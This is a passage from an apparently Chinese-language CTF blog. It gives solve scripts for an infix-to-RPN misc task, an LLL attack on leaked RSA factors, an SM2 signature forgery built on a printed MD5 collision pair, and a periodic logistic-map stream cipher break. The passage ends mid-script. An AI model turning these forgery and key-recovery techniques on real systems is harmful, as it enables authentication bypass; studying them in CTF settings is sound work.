&#x27;&#x27;.join(random.choices(tuple(VARS), k=10))    return name, BitVec(name, WIDTH)def combine(    op: str,    left: tuple[str, BitVecRef],    right: tuple[str, BitVecRef] | None = None,) -&gt; tuple[str, ArithRef]:    if op == &#x27;~&#x27;:        s_left, z_left = left        return f&#x27;(~&#123;s_left&#125;)&#x27;, ~z_left    s_l, z_l = left    s_r, z_r = right    return f&#x27;(&#123;s_l&#125; &#123;op&#125; &#123;s_r&#125;)&#x27;, &#123;        &#x27;&amp;&#x27;: z_l &amp; z_r,        &#x27;^&#x27;: z_l ^ z_r,        &#x27;|&#x27;: z_l | z_r,    &#125;[op]def random_expr(depth: int = 0) -&gt; tuple[str, ArithRef]:    if depth &gt;= MAX_DEPTH or random.random() &lt; 0.1:        return random.choice((rnd_var, rnd_const))()    op = random.choice(OPS)    if op == &#x27;~&#x27;:        return combine(op, random_expr(depth + 1))    return combine(op, random_expr(depth + 1), random_expr(depth + 1))TOKEN_RE = re.compile(r&#x27;[0-9]+|[iIl]+|[~&amp;^|]&#x27;)def parse_rpn(s: str) -&gt; ArithRef:    tokens = TOKEN_RE.findall(s)    if not tokens:        raise ValueError(&#x27;empty input&#x27;)    var_cache: dict[str, BitVecRef] = &#123;&#125;    stack: list[BitVecRef] = []    for t in tokens:        if t.isdigit():            stack.append(BitVecVal(int(t), WIDTH))        elif re.fullmatch(r&#x27;[iIl]+&#x27;, t):            if t not in var_cache:                var_cache[t] = BitVec(t, WIDTH)            stack.append(var_cache[t])        elif t in OPS:            if t == &#x27;~&#x27;:                if len(stack) &lt; 1:                    raise ValueError(&#x27;stack underflow&#x27;)                a = stack.pop()                stack.append(~a)            else:                if len(stack) &lt; 2:                    raise ValueError(&#x27;stack underflow&#x27;)                b = stack.pop()                a = stack.pop()                stack.append(&#123;&#x27;&amp;&#x27;: a &amp; b, &#x27;^&#x27;: a ^ b, &#x27;|&#x27;: a | b&#125;[t])        else:            raise ValueError(f&#x27;bad token &#123;t&#125;&#x27;)    if len(stack) != 1:        raise ValueError(&#x27;malformed expression&#x27;)    return stack[0]def equivalent(e1: ArithRef, e2: ArithRef) -&gt; tuple[bool, Solver]:    s = Solver()    s.set(timeout=5000)    s.add(simplify(e1) != simplify(e2))    return s.check() == unsat, sdef _timeout_handler(_: int, __) -&gt; None:    raise TimeoutErrordef main() -&gt; None:    signal.signal(signal.SIGALRM, _timeout_handler)    print(&#x27;lets play a game!&#x27;)    for _ in range(50):        random.seed()        expr_str, expr_z3 = random_expr()        print(expr_str, flush=True)        signal.alarm(5)        try:            line = sys.stdin.readline()            signal.alarm(0)        except TimeoutError:            print(&#x27;too slow!&#x27;)            return        try:            rpn_z3 = parse_rpn(line.strip())        except Exception as e:            print(&#x27;invalid input:&#x27;, e)            return        print(&#x27;let me see..&#x27;)        is_eq, s = equivalent(expr_z3, rpn_z3)        if not is_eq:            print(&#x27;wrong!&#x27;)            with contextlib.suppress(BaseException):                print(&#x27;counter example:&#x27;, s.model())            return    print(FLAG)if __name__ == &#x27;__main__&#x27;:    main()\n咱倒是没想到一个misc题居然这么好心，完成了任务就真的给你flag。\n这题目像是给大学生准备的（笑）题目给出一个中缀表达式，要求给出它对应的后缀表达式，并检验是否等效，规定时间内通过50次检验就能得到flag。中缀转后缀，只要学过数据结构或者算法的都应该能写出来，再不济让ChatGPT写，它很擅长做这种大学课后习题对于一个表达式 &#39;((~((~1925064568) ^ (~(~(348138675 &amp; IIiIlIillI))))) &amp; (~(~(((iIllIIIIII &amp; 648807684) | (4074926542 | iIilIIIiiI)) | (iiiiIIliIl ^ (203353170 ^ 3427631998))))))&#39;，转成后缀表达式(RPN)需要先划词为&#39;(&#39;, &#39;~&#39;, &#39;1925064568&#39;等token，借助一个栈，将符号按照优先级移到操作数的后面，由于本题生成的表达式均有括号包裹，可以避免^&amp;|~这四种符号的优先级问题。对于括号，每当遇到&#39;)&#39;时，就从栈内弹出符号直到匹配&#39;(&#39;，这两者中间的表达式就可以直接移动符号。上述表达式转换后为 &#39;1925064568 ~ 348138675 IIiIlIillI &amp; ~ ~ ^ ~ iIllIIIIII 648807684 &amp; 4074926542 iIilIIIiiI | | iiiiIIliIl 203353170 3427631998 ^ ^ | ~ ~ &amp;&#39; 。signal.alarm(5)表示5秒后进入超时处理部分，本题只是简单抛出TimeoutError，经由main函数捕获后告知&#39;too slow!&#39;，手动计算并复制到命令行不易且容易出错，交由pwntool库自动交互完成。使用recvline()接收一行，recvuntil()接收直到指定的字节串，sendline()发送一行字节串。注意所有发送和接收到的都是字节，可以使用decode()方法变为字符串。交互不难！使用合适的方法，获取关键信息，加以处理，再传回去~\nfrom pwn import *import re# 用于将输入字符串切分成 tokenTOKEN_RE = re.compile(r&#x27;([0-9]+|[iIl]+|[~&amp;^|]|\\(|\\))&#x27;)def tokenize(expr: str) -&gt; list[str]:    &quot;&quot;&quot;    将中缀表达式字符串拆分成 token 列表。    支持：      - 十进制整数，如 1234      - 由 i, I, l 构成的变量名，如 iiIIlI      - 单字符运算符 ~ &amp; ^ |      - 括号 ( )    &quot;&quot;&quot;    tokens = TOKEN_RE.findall(expr)    if &#x27;&#x27;.join(tokens) != expr.strip().replace(&#x27; &#x27;, &#x27;&#x27;):        raise ValueError(&quot;非法字符或格式错误&quot;)    return tokensdef infix_to_rpn(expr: str) -&gt; str:    &quot;&quot;&quot;    将中缀表达式 expr 转成逆波兰表达式，    返回一个以空格分隔的 RPN 字符串。    &quot;&quot;&quot;    tokens = tokenize(expr)    # 运算符优先级    prec = &#123;&#x27;~&#x27;: 4, &#x27;&amp;&#x27;: 3, &#x27;^&#x27;: 2, &#x27;|&#x27;: 1&#125;    # 一元运算符 ~ 右结合，二元运算符左结合    right_assoc = &#123;&#x27;~&#x27;&#125;    output: list[str] = []    ops: list[str] = []    for t in tokens:        if re.fullmatch(r&#x27;\\d+|[iIl]+&#x27;, t):            # 数字或变量            output.append(t)        elif t in prec:            # 运算符            while ops and ops[-1] in prec:                top = ops[-1]                if (prec[top] &gt; prec[t] or                        (prec[top] == prec[t] and t not in right_assoc)):                    output.append(ops.pop())                else:                    break            ops.append(t)        elif t == &#x27;(&#x27;:            ops.append(t)        elif t == &#x27;)&#x27;:            # 弹出直到左括号            while ops and ops[-1] != &#x27;(&#x27;:                output.append(ops.pop())            if not ops or ops[-1] != &#x27;(&#x27;:                raise ValueError(&quot;括号不匹配&quot;)            ops.pop()  # 丢弃 &#x27;(&#x27;        else:            raise ValueError(f&quot;未知 token: &#123;t&#125;&quot;)    # 最后把剩余运算符都弹出    while ops:        if ops[-1] in (&#x27;(&#x27;, &#x27;)&#x27;):            raise ValueError(&quot;括号不匹配&quot;)        output.append(ops.pop())    return &#x27; &#x27;.join(output)conn = remote(&#x27;gacha-gate.chal.idek.team&#x27;, 1337)context.log_level = &#x27;debug&#x27;conn.recvuntil(b&#x27;lets play a game!\\n&#x27;)for i in range(50):    expression = conn.recvline().decode()    #print(f&#x27;expression: &#123;expression&#125;&#x27;)    ans = infix_to_rpn(expression)    conn.sendline(ans.encode())    conn.recvuntil(b&#x27;let me see..\\n&#x27;)conn.interactive()\n后记太弱啦太弱啦！crypto和re双修的我根本做不出来几道呢，我很想看看那几道椭圆曲线的题目是如何解的，一点思路都没有，以及那个5美元外包的vm，虽然已经有一些进展了（指看到了输入 i 可以调出寄存器），但是后面的工程似乎还很大，猪脑过载了喵&gt;_&lt;\n等大手子师傅的wp（躺\n","categories":["笔记"],"tags":["Writeup","2025","idekCTF"]},{"title":"2025 华为杯Crypto题解","url":"/2025/10/29/2025%20%E5%8D%8E%E4%B8%BA%E6%9D%AF%E9%A2%98%E8%A7%A3/","content":"前言这比赛……怎么说呢，挺搞的，延期又延期，延到一个咱一整天课的日子，于是一上午都没看；中午吃瓜吃到大家九点钟准时登录平台发现一道题没有，直到大概40分钟后才有题，再加上一些其他的冲突，总之不少选手怨声载道的。\n不过研究生就是好啊，先前打的一堆比赛给我打自闭了，一道题做不出来参与感0，这下至少能做几道密码了。但是签到题怎么交都交不上去，我不明白，这确实得骂一骂主办方吧。\n正文srsa 100ptimport osimport ptyfrom Crypto.Util.number import *from secret import flagmenu = &quot;&quot;&quot;[1] Get Public Key[2] Get Ciphertext[3] Get Gift[4] Exit&quot;&quot;&quot;if __name__ == &quot;__main__&quot;:    m = bytes_to_long(flag)    p = getPrime(512)    q = getPrime(512)    e = getPrime(64)    cnt = 0    while True:        try:            print(menu)            choice = int(input(&quot;Your choice: &quot;))            if choice == 1:                n = p * q                print(f&quot;n = &#123;n&#125;&quot;)                print(f&quot;e = &#123;e&#125;&quot;)            elif choice == 2:                n = p * q                c = pow(m, e, n)                print(f&quot;c = &#123;c&#125;&quot;)            elif choice == 3:                if cnt == 2:                    print(&quot;You know too much!!!&quot;)                    continue                k = getPrime(384)                r = getPrime(128)                gift = k * p + r                print(f&quot;&#123;gift = &#125;&quot;)                cnt += 1            elif choice == 4:                print(&quot;Bye!&quot;)                break            else:                print(&quot;Invalid choice&quot;)        except:            print(&quot;You can&#x27;t do this!&quot;)            break\n一道RSA，给出了n, e, c和两个关于p的gift。直接丢给Gemini，它帮助我分析了每个变量，然后造了格（）单凭我应该是想不到的。\n已知：$n=pq$，$gift_1=k_1p+r_1$，$gift_2=k_2p+r_2$，因此将$p$换成$n/q$，则有$gift_1\\times q=k_1n+r_1q$，$gift_2$同理，因此构造矩阵$\\begin{bmatrix} n &amp; 0 &amp; 0\\newline 0 &amp; n &amp; 0\\newline gift1 &amp; gift2 &amp; 1\\end{bmatrix}$，这就是一个格，满足关系式\n\\left[-k_1,-k_2,q\\right]\\begin{bmatrix}\n n & 0 & 0\\newline\n 0 & n & 0\\newline\n gift1 & gift2 & 1\n\\end{bmatrix}=[qr_1,qr_2,q]简单提一嘴格基规约(LLL)，它的作用是从“大”的基中找到“更小”的基，我们现在有一个三阶矩阵（三个行向量）张成的空间，但是每个基向量都太长了，n是1024位数，gift都是896位数，因此第一行和第二行向量的长度均为$2^{1024}$，第三行长度为$\\sqrt{(gift_1)^2+(gift_2)^2+1}\\approx2^{896}$，而我们通过上面的关系式可以知道，这个空间可以用一组更小的基向量表示，这组基向量有一个——也就是$[qr_1,qr_2,q]$，它异常短，长度只有$\\sqrt{(qr_1)^2+(qr_2)^2+q^2}\\approx2^{640}$，在一个基向量都很大的空间里，这是很罕见的。\n以及由于格基规约的性质，它倾向于找到三个分量差不多的基，因此可以将矩阵右下角那个1改成$2^{128}$，这样三个分量长度就差不多了，更容易找到这组基。还好本题的小基差距很明显，不优化也能成功。\n解出q之后RSA部分就不提了，最终的代码如下。\nfrom Crypto.Util.number import *from pwn import *conn = remote(&#x27;192.168.18.25&#x27;, 9999)conn.sendafter(b&#x27;Your choice: &#x27;, b&#x27;1\\n&#x27;)conn.recvuntil(b&#x27;n = &#x27;)n = int(conn.recvline())conn.recvuntil(b&#x27;e = &#x27;)e = int(conn.recvline())conn.sendafter(b&#x27;Your choice: &#x27;, b&#x27;2\\n&#x27;)conn.recvuntil(b&#x27;c = &#x27;)c = int(conn.recvline())conn.sendafter(b&#x27;Your choice: &#x27;, b&#x27;3\\n&#x27;)conn.recvuntil(b&#x27;gift = &#x27;)gift_1 = int(conn.recvline())conn.sendafter(b&#x27;Your choice: &#x27;, b&#x27;3\\n&#x27;)conn.recvuntil(b&#x27;gift = &#x27;)gift_2 = int(conn.recvline())# --------------------------------------------------# LLL 攻击实现# --------------------------------------------------print(&quot;开始构建格...&quot;)# 1. 构建格矩阵 B#    [ n,    0,    0 ]#    [ 0,    n,    0 ]#    [ gift_1, gift_2, 1 ]B = Matrix(ZZ, [    [n, 0, 0],    [0, n, 0],    [gift_1, gift_2, 1]])print(&quot;格矩阵 B:&quot;)print(B)# 2. 运行 LLL 算法print(&quot;\\n正在运行 LLL 算法...&quot;)# B.LLL() 返回一个新的（约简后的）基B_reduced = B.LLL()print(&quot;LLL 约简后的基 (B_reduced):&quot;)print(B_reduced)# 3. 提取 q# LLL 找到的第一个向量 (B_reduced[0]) 应该就是我们寻找的短向量# v_target = (q*r1, q*r2, q)# 所以，第三个分量就是 q (或 -q)q = abs(B_reduced[0][2])print(&quot;\\n--- 结果 ---&quot;)# 4. 验证和分解 nif n % q == 0 and q &gt; 1 and q &lt; n:    p = n // q    print(f&quot;[+] 成功找到 p 和 q！&quot;)    print(f&quot;p = &#123;p&#125;&quot;)    print(f&quot;q = &#123;q&#125;&quot;)    # 最终验证    if p * q == n:        print(&quot;[+] 验证成功: p * q == n&quot;)    else:        print(&quot;[-] 验证失败: p * q != n&quot;)else:    print(f&quot;[-] LLL 攻击失败。&quot;)    print(f&quot;提取到的 q = &#123;q&#125;&quot;)    print(&quot;[-] q 不是 n 的有效因子。请检查 n 和 gifts 是否正确。&quot;)    exit(0)conn.close()assert n%q == 0p = n//q# 2. 计算欧拉函数 φ(n)phi_n = (q - 1)*(p - 1)# 3. 计算 d (e 的模 φ(n) 的乘法逆元)d = inverse(e, phi_n)print(&quot;d = &quot;,d)# 4. 解密消息 mm = pow(c, d, n)  # 快速模幂运算print(&quot;解密后的消息 m 为:&quot;, long_to_bytes(m))\nSign4Flag 200ptimport osimport ptyfrom Crypto.Util.number import *from gmssl import sm2, funcfrom hashlib import *from secret import flag, private_key, public_keysm2_crypt = sm2.CryptSM2(private_key=private_key, public_key=public_key)def sign(msg):    signature = sm2_crypt.sign(md5(msg).digest(), os.urandom(32).hex())    return signaturedef verify(msg, sig):    return sm2_crypt.verify(sig, md5(msg).digest())def login(usrname, passwd, sig):    if usrname != usr:        return False    if not verify(long_to_bytes(passwd), sig):        return False    return Truemenu = &quot;&quot;&quot;Flag management system[1] Sign in[2] Register[3] Forgot password[4] Exit&quot;&quot;&quot;usr = &quot;admin&quot;a = getPrime(64)sig = sign(long_to_bytes(13337))if __name__ == &quot;__main__&quot;:    while True:        try:            print(menu)            op = input(&quot;&gt; &quot;)            if op == &quot;1&quot;:                username = input(&quot;Username: &quot;)                password = int(input(&quot;Password: &quot;))                if login(username, password, sig):                    print(f&quot;Welcome admin! Here is your flag: &#123;flag[:GCD(password, a)]&#125;&quot;)                else:                    print(&quot;Wrong username or password!&quot;)                break            elif op == &quot;2&quot;:                print(&quot;Sorry, registration is closed.&quot;)            elif op == &quot;3&quot;:                tmp = int(input(&quot;New password &gt; &quot;))                tmp2 = int(input(&quot;Security number &gt; &quot;))                if not isPrime(tmp):                    print(&quot;Password must be prime!&quot;)                    continue                if tmp2 &gt;= tmp:                    print(&quot;Security number too large!&quot;)                    continue                if tmp2 &lt;= 0:                    print(&quot;Security number invalid!&quot;)                    continue                sig = sign(long_to_bytes(tmp))                a = tmp2                print(&quot;Password changed!&quot;)            elif op == &quot;4&quot;:                print(&quot;Bye~&quot;)                break            else:                print(&quot;Invalid option!&quot;)        except:            print(&quot;Something wrong&quot;)            break\n题目可以重置密码和a，但是密码一定是质数，a小于密码，这样重置后验证的GCD(password,a)只能是1，得不到全部的flag。因此考虑伪造签名。签名之前对消息进行了一次md5，可以找两串md5相同的字节b1和b2，bytes_to_long(b1)是质数，bytes_to_long(b2)是合数，这样可以将密码修改为bytes_to_long(b1)，a修改为bytes_to_long(b2)的一个稍大的因子，输入密码时输入bytes_to_long(b2)，即可泄露更多位。\n由于b1和b2的md5相同，因此对于sm2来说它们就是同一个值，自然可以通过验签。但是实际上md5碰撞产生至少一个质数的概率并不大（如果真的有幸抽到了两个质数，md5还相同，那让密码是大的那个质数，a是小的那个质数就行了）。如果只是不断用fastcoll去生成碰撞对，实测不太有希望得到质数。但是，md5可以使用长度扩展攻击，也就是说，同一个md5的两串字节，后面再加上同样的字节，md5仍相同。因此可以在一组碰撞实例的末尾拼接上一个奇数，期望得到一个质数。\nfrom Crypto.Util.number import isPrime, bytes_to_long, long_to_bytesimport hashlibx = &quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&quot;y = &quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&quot;print(&quot;x : &quot;, bytes_to_long(bytes.fromhex(x)))print(&quot;md5(x) : &quot;, hashlib.md5(bytes.fromhex(x)).hexdigest())print(&quot;md5(y) : &quot;, hashlib.md5(bytes.fromhex(y)).hexdigest())z = 1xx = 0yy = 0while True:    # append 1s till prime    xx = bytes_to_long(bytes.fromhex(x) + long_to_bytes(z))    yy = bytes_to_long(bytes.fromhex(y) + long_to_bytes(z))    if isPrime(xx) or isPrime(yy):        break    z += 2print(&quot;x+z :&quot;, xx)print(&quot;y+z :&quot;, yy)print(&quot;md5(x+z) : &quot;, hashlib.md5(long_to_bytes(xx)).hexdigest())print(&quot;md5(y+z) : &quot;, hashlib.md5(long_to_bytes(yy)).hexdigest())\n突然感觉md5很有意思，构造碰撞的时候可以指定开头，长度扩展攻击可以指定结尾，不知道最短的碰撞对有多长，在这个长度以后的数据完全可以自定义了，想续啥就续啥。如果指定了中间部分的话，转化成开头或者结尾咯。这也恰恰说明了md5有多么不安全（笑）\nstream 300pt比赛的时候没做出来，虽然Gemini和ChatGPT已经提供了很好的思路，但是我还是误入了歧途（）赛后研究一晚上才拿下。\nfrom decimal import *from Crypto.Util.number import bytes_to_longfrom os import urandomfrom hashlib import sha512from gmssl import sm3, funcfrom random import choicesfrom string import printablefrom tqdm import trangefrom secret import flag, keygetcontext().prec = 100def sm3_hash(msg):    msg = func.bytes_to_list(msg)    hash_value = sm3.sm3_hash(msg)    return bytes.fromhex(hash_value)class RC2147483648:    def __init__(self, seed):        self.state = seed    def getByte(self):        t = str(self.state)        bs = sm3_hash(t.encode())        return bs[-1]    def getSstream(self, n):        ss = b&#x27;&#x27;        for _ in trange(n):            ss += self.getByte().to_bytes(1, &#x27;big&#x27;)            self.next()        return ss    def next(self):        u = Decimal(3.5699456)        self.state = self.state * u * (Decimal(1) - self.state)    def encrypted(self, pt):        out = b&#x27;&#x27;        Sstream = self.getSstream(len(pt))        for i in range(len(msg)):            out += (msg[i] ^ Sstream[i]).to_bytes(1, &#x27;big&#x27;)        return out    def decrypted(self, ct):        &quot;&quot;&quot;        emmm...        &quot;&quot;&quot;encrypter = RC2147483648(key)msg = &quot;&quot;.join(choices(printable, k=1048576)).encode()msg = msg[:len(msg)//2] + b&#x27;\\x00&#x27; + flag + b&#x27;\\x00&#x27; + msg[len(msg)//2:] + b&#x27;\\x00\\x00\\x00\\x00&#x27;ct = encrypter.encrypted(msg)f = open(&#x27;ciphertext&#x27;, &#x27;wb&#x27;)f.write(ct)f.close()\n一个稀奇古怪的加密，使用逻辑斯谛映射(logistic map)从初始seed不断导出下一个状态，每个状态经过SM3散列得到一个字节，大概长这样\n\n\\begin{array}{rccccc}\n\\text{State:} & S_0 (\\text{seed}) & \\xrightarrow{S_{n+1}=uS_n(1-S_n)} & S_1 & \\xrightarrow{S_{n+1}=uS_n(1-S_n)} & S_2 & \\xrightarrow{S_{n+1}=uS_n(1-S_n)} & \\dots \\\\\n& \\downarrow\\tiny \\text{sm3, lastbyte}    &  & \\downarrow\\tiny \\text{sm3, lastbyte}    & & \\downarrow\\tiny \\text{sm3, lastbyte}  &   \\\\\n\\text{Key:}   & K_0     &   & K_1    &    & K_2    &&  \\dots\n\\end{array}加密器不断得到连续的字节流，异或明文得到密文。因此，虽然它没有给解密算法，只要我们有key，完全可以自己将密钥流生成出来，异或得到明文。但问题是我们没有key，而key可能是一个100位的小数，爆破是不现实的。\n尊贵的ChatGPT大人搜寻到了资料，它是这么说的\n\n（1）在有限精度下 logistic-map 类 PRNG 会退化并产生可估计的周期/模式、（2）已知明文/已知 keystream 位置会被用来恢复初始条件或参数，因此该方案并非形式上安全。\n\n这个加密方案的两个可能的弱点GPT都提到了，按照GPT给出的论文来看，这篇文章似乎很有用。它提及在参数$3\\lt\\lambda\\lt3.7$时，state会陷入周期，系统没能表现出混沌性。因此，这个加密是周期性的异或，而非一次一密。而周期性的异或加上明文可打印的条件，是可以逐个位置减少密钥空间，乃至恢复密钥的。\n我们小心求证一下，对于给定的参数u=3.5699456，随机选取1000个种子，每个种子生成1048576个字节的密钥流，验证是否存在较短的周期。\nimport randomfrom decimal import Decimal, getcontextfrom gmssl.sm3 import sm3, funcfrom tqdm import trange, tqdmgetcontext().prec = 100def sm3_hash(msg):    msg = func.bytes_to_list(msg)    hash_value = sm3.sm3_hash(msg)    return bytes.fromhex(hash_value)class RC2147483648:    def __init__(self, seed):        if not (Decimal(0) &lt; seed &lt; Decimal(1)):            raise ValueError(&quot;Seed必须在 (0, 1) 范围内&quot;)        self.state = seed        self.u = Decimal(&#x27;3.5699456&#x27;)    def getByte(self):        t = str(self.state)        bs = sm3_hash(t.encode())        return bs[-1]    def next(self):        self.state = self.state * self.u * (Decimal(1) - self.state)        if not (Decimal(0) &lt; self.state &lt; Decimal(1)):            self.state = Decimal(random.randint(1, 999999)) / Decimal(1000000)        return self.state    def getSstream(self, n):        ss = b&#x27;&#x27;        for _ in trange(n, desc=&quot;Generating S-stream&quot;):            ss += self.getByte().to_bytes(1, &#x27;big&#x27;)            self.next()        return ss    def encrypted(self, pt):        out = b&#x27;&#x27;        Sstream = self.getSstream(len(pt))        for i in range(len(pt)):            out += (pt[i] ^ Sstream[i]).to_bytes(1, &#x27;big&#x27;)        return outdef check_short_cycle(seed, max_iter, period_limit):    &quot;&quot;&quot;    检查给定种子是否在 max_iter 步内    产生一个长度小于 period_limit 的循环。    使用字典来跟踪 &quot;状态 -&gt; 迭代次数&quot;    &quot;&quot;&quot;    rc = RC2147483648(seed)    states_seen = &#123;&#125;  # 字典: &#123;state: iteration_number&#125;    for i in range(max_iter):        current_state = rc.next()        if current_state in states_seen:            # 发现循环！            first_seen_at = states_seen[current_state]            cycle_len = i - first_seen_at            if cycle_len &lt; period_limit:                # 发现了短周期                return True, cycle_len  # (找到短周期, 周期长度)            else:                # 周期不够短，但也算找到了                return False, cycle_len # (未找到短周期, 周期长度)                states_seen[current_state] = i    # 在 max_iter 步内未找到任何循环    return False, None  # (未找到短周期, 未知周期)def run_test_suite(num_seeds, max_iter, period_limit):    &quot;&quot;&quot;    运行完整的测试套件    &quot;&quot;&quot;    print(f&quot;--- 开始周期性测试 ---&quot;)    print(f&quot;测试种子数: &#123;num_seeds&#125;&quot;)    print(f&quot;最大迭代次数/种子: &#123;max_iter&#125; (2^&#123;int(max_iter.bit_length()-1)&#125;)&quot;)    print(f&quot;短周期阈值: &#123;period_limit&#125; (2^&#123;int(period_limit.bit_length()-1)&#125;)&quot;)    print(f&quot;Decimal 精度: &#123;getcontext().prec&#125; 位&quot;)    print(&quot;-&quot; * 20)    short_cycle_count = 0    found_cycles = []    # 使用tqdm显示总进度    for i in tqdm(range(num_seeds), desc=&quot;Testing Seeds&quot;):        # 生成一个随机的、高精度的种子 (0, 1)        # 我们用字符串来确保精度        rand_str = &#x27;0.&#x27; + &#x27;&#x27;.join(random.choices(&#x27;0123456789&#x27;, k=getcontext().prec - 1))        seed = Decimal(rand_str)                # 确保种子有效        if seed == Decimal(0) or seed == Decimal(1):            continue        try:            is_short, cycle_len = check_short_cycle(seed, max_iter, period_limit)                        if is_short:                short_cycle_count += 1                found_cycles.append((str(seed), cycle_len))                except ValueError as e:            # 捕获 &quot;Seed必须在 (0, 1) 范围内&quot; 的错误（如果状态逸出）            tqdm.write(f&quot;种子 &#123;str(seed)[:10]&#125;... 在迭代中失效: &#123;e&#125;&quot;)        except Exception as e:            tqdm.write(f&quot;种子 &#123;str(seed)[:10]&#125;... 发生未知错误: &#123;e&#125;&quot;)    print(&quot;\\n--- 测试结果 ---&quot;)    print(f&quot;在 &#123;num_seeds&#125; 个随机种子中，&quot;)    print(f&quot;**发现 &#123;short_cycle_count&#125; 个种子的周期小于 &#123;period_limit&#125;。**&quot;)    if short_cycle_count &gt; 0:        print(&quot;\\n发现短周期的种子（部分示例）:&quot;)        for seed_str, length in found_cycles[:10]:            print(f&quot;  - 种子 (前10位): &#123;seed_str[:12]&#125;... \\t周期: &#123;length&#125;&quot;)if __name__ == &quot;__main__&quot;:    NUM_SEEDS = 1000        # 你要求的种子数量    MAX_ITER = 2**20        # 1,048,576    PERIOD_LIMIT = 2**15    # 32,768    run_test_suite(NUM_SEEDS, MAX_ITER, PERIOD_LIMIT)\n经过测试，在1000次实验中，1000次的周期都小于32768，进一步测试表明周期均为4096。这说明了虽然我们不知道题目使用的seed，但是大概率周期同样是4096，我们根据这个周期进行破解。\n我们已知：flag前后均有一个0x00，明文最后四个字节是0x00，其余字符均为可打印字符。因此，对于每个位置，遍历0到255，对于这个位置对应的所有密文，异或这个密钥应该是可打印明文（或者刚才那几个特定的位置上是0x00）。如果出现不可打印的明文，则这个密钥一定不正确。对于有0x00存在的位，还有更高效的策略：由于0x00异或任何数都不改变另一个数，所以这个位置的密文直接就是密钥。经过大量密文的筛选，每个位置上的候选密钥都不会太多。\n由于密文长为1048619，可打印的随机字符串长为1048576，0x00共有6个，因此flag一共37位。因此我们只需要这37个位置的密钥就足够了，其他位置即使密钥不能完全确定也不影响。\n需要注意的是，周期为4096并不代表从一开始整个加密器就进入了周期。事实上，加密器会先运行一段时间才陷入循环。因此，密文开头的数据需要舍弃。在将尽可能多的数据纳入分析后，只有最前的172068个字节不能保留。如果留下它们，则会引起冲突，找不到能使所有密文都变成可打印明文的密钥了。\n# 策略:# 1. 使用 KPA (flag&#123;, 0x00s) (约束 1)# 2. 使用 flag 之后的可打印数据 (约束 2a)# 3. 使用 flag 之前约 60% 的可打印数据 (约束 2b)# 4. 在递归求解时，假设 flag 主体也是可打印的 (约束 3)# 5. 只求解 flag 主体必需的密钥import stringimport sysfrom tqdm import tqdmfrom math import prod# --- 常量 ---CT_FILE = &#x27;ciphertext&#x27;PERIOD = 4096def main():    print(f&quot;[*] 正在加载密文文件: &#123;CT_FILE&#125;&quot;)    try:        with open(CT_FILE, &#x27;rb&#x27;) as f:            ct = f.read()        L_ct = len(ct)        print(f&quot;[*] 密文加载成功，总长度: &#123;L_ct&#125; 字节&quot;)    except FileNotFoundError:        print(f&quot;[!] 错误: 密文文件 &#x27;&#123;CT_FILE&#125;&#x27; 未找到。&quot;)        sys.exit(1)    # --- 1. 定义所有常量和范围 ---    L_RANDOM_MSG_TOTAL = 1048576    L_RANDOM_PART1 = L_RANDOM_MSG_TOTAL // 2  # 524288    L_KNOWN_PLAINTEXT_BYTES = 6    L_flag = L_ct - L_RANDOM_MSG_TOTAL - L_KNOWN_PLAINTEXT_BYTES    if L_flag &lt; 0:        print(f&quot;[!] 错误: 密文长度 &#123;L_ct&#125; 太短。&quot;)        sys.exit(1)    print(f&quot;[*] 周期 $p=&#123;PERIOD&#125;$。推断: len(flag) = &#123;L_flag&#125; 字节&quot;)    L_CONTAMINANT_MID = L_flag + 2    # `flag` 的范围 (不包括 b&#x27;\\x00flag&#123;&#x27;)    flag_body_start_idx = L_RANDOM_PART1 + 1 + 5  # 5 for &#x27;flag&#123;&#x27;    flag_body_end_idx = flag_body_start_idx + (L_flag - 5)    flag_body_ct = ct[flag_body_start_idx: flag_body_end_idx]    # 范围 2a : flag 之后的数据    slice2_start = L_RANDOM_PART1 + L_CONTAMINANT_MID    slice2_end = L_ct - 4    slice2_range = (slice2_start, slice2_end)    # 范围 2b : flag 之前的数据    slice1_reliable_start = int(L_RANDOM_PART1 * 0.3281937)  # 524288 * 0.3281937 = 172068，至少需要排除这么多，否则无解    slice1_reliable_end = L_RANDOM_PART1    slice1_reliable_range = (slice1_reliable_start, slice1_reliable_end)    print(f&quot;[*] &#x27;约束 2&#x27; 将使用两个数据范围:&quot;)    print(f&quot;    - 暂态后 (slice1) 范围: &#123;slice1_reliable_range&#125;&quot;)    print(f&quot;    - 稳定 (slice2) 范围: &#123;slice2_range&#125;&quot;)    # 约束 3 (Printable flag) 的范围    PRINTABLE_BYTES = set(string.printable.encode(&#x27;ascii&#x27;))    # 随机数据部分不包含 0x00    PRINTABLE_ONLY = PRINTABLE_BYTES - &#123;0&#125; if 0 in PRINTABLE_BYTES else PRINTABLE_BYTES    # --- 2. 建立所需密钥的候选列表 ---    # 获取 flag_body (flag&#123;...&#125; 中 ... 的部分) 所需的密钥位置    flag_body_key_positions = []    for i in range(len(flag_body_ct)):        flag_body_key_positions.append((flag_body_start_idx + i) % PERIOD)    unique_key_positions = set(flag_body_key_positions)    # key_candidates: 存储每个 *必需* 密钥位置的可能值    key_candidates = &#123;pos: set(range(256)) for pos in unique_key_positions&#125;    print(f&quot;[*] Flag 主体 (&#123;len(flag_body_ct)&#125; 字节) 依赖于 &#123;len(unique_key_positions)&#125; 个唯一的密钥字节。&quot;)    # --- 3. 应用约束 1 (已知明文) ---    print(f&quot;[*] 正在应用“约束 1”(已知明文)...&quot;)    known_pt = &#123;&#125;    # b&#x27;\\x00&#x27; at start of flag block    known_pt[L_RANDOM_PART1] = 0x00    # b&#x27;flag&#123;&#x27;    prefix = b&#x27;flag&#123;&#x27;    for i in range(len(prefix)):        known_pt[L_RANDOM_PART1 + 1 + i] = prefix[i]    # b&#x27;\\x00&#x27; at end of flag block    known_pt[L_RANDOM_PART1 + 1 + L_flag] = 0x00    # b&#x27;\\x00\\x00\\x00\\x00&#x27; at end of file    for i in range(4):        known_pt[L_ct - 4 + i] = 0x00    # 用已知明文过滤 key_candidates    for idx, pt_byte in known_pt.items():        pos = idx % PERIOD        if pos in key_candidates:            key_byte = ct[idx] ^ pt_byte            # 这是一个强约束，我们只保留这一个值            key_candidates[pos].intersection_update(&#123;key_byte&#125;)    # --- 4. 应用约束 2 (Printable msg) ---    